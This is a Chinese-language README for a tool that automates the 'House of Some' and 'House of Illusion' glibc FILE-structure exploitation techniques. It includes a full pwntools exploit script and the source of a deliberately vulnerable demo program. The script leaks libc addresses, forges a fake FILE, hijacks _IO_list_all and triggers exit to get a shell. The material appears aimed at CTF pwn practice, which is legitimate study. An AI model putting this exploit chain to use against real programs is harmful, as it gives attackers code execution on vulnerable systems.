# Some of House

[![Hits](https://hits.sh/github.com/CsomePro/Some-of-House.svg?label=Visitors&extraCount=-422)](https://hits.sh/github.com/CsomePro/Some-of-House/)

House实用小工具合集

## 目前已包含的House

House of Some: https://blog.csome.cc/p/house-of-some/

House of Illusion: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more

## HouseOfSome x Illusion的自动化

在exit退出之后使用如下脚本即可

```python
from SomeofHouse import HouseOfSome
io = process("./demo")

...

libc = ELF("./libc.so.6", checksec=None)
libc.address = libc_base
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
hos.bomb(io)
```

- controled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址

### 举个例子

```python
from pwn import *
from SomeofHouse import HouseOfSome

context.log_level = 'debug'
context.arch = 'amd64'

tob = lambda x: str(x).encode()
io = process("./demo")

io.recvuntil(b"[+] printf: ")
printf_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"printf_addr: {printf_addr:#x}")

def add(size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size> ", tob(size))
    
def write(addr, size, content):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"size> ", tob(size))
    io.sendlineafter(b"addr> ", tob(addr))
    io.sendafter(b"content> ", content)

def leave():
    io.sendlineafter(b"> ", b"3")

libc = ELF("./libc.so.6", checksec=None)
add(0x200)
io.recvuntil(b"[+] done ")
heap_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"heap_addr: {heap_addr:#x}")

libc_base = printf_addr - libc.symbols["printf"]
log.success(f"libc_base: {libc_base:#x}")

libc.address = libc_base
fake_file_start = heap_addr + 0xe0 + 0xe8
# 上方是信息收集
# ------------------------------------------------- # 
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
# 构造第一个任意地址写原语
payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0)
io.sendlineafter(b"content> ", payload)
write(libc.symbols["_IO_list_all"], 8, p64(heap_addr)) # 劫持_IO_list_all
leave() # exit

hos.bomb(io) # 一句话攻击

io.interactive()
```

demo.c源码

```python
#include<stdio.h>

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    int c;
    printf("[+] printf: %p\n", &printf);
    while (1) {
        printf(
            "1. add heap.\n"
            "2. write libc.\n"
            "3. exit\n"
            "> "
        );
        scanf("%d", &c);
        if(c == 1) {
            int size;
            printf("size> ");
            scanf("%d", &size);
            char *p = malloc(size);
            printf("[+] done %p\n", p);
            printf("content> ");
            read(0, p, size);
        } else if(c == 2){
            size_t addr, size;
            printf("size> ");
            scanf("%lld", &size);
            printf("addr> ");
            scanf("%lld", &addr);
            printf("content> ");
            read(0, (char*)addr, size);
        } else {
            break;   
        }
        
    }
    
}
```

## Stars
[![Stargazers over time](https://starchart.cc/CsomePro/Some-of-House.svg?variant=adaptive)](https://starchart.cc/CsomePro/Some-of-House)





